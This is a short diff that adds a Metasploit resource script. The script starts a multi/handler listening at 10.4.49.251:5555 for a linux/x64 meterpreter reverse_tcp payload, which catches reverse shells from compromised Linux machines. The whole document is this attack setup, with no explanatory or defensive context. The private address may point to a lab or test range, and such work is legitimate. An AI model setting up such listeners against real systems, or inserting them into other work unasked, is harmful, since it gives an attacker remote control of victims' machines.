@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost 10.4.49.251
+set lport 5555
+run
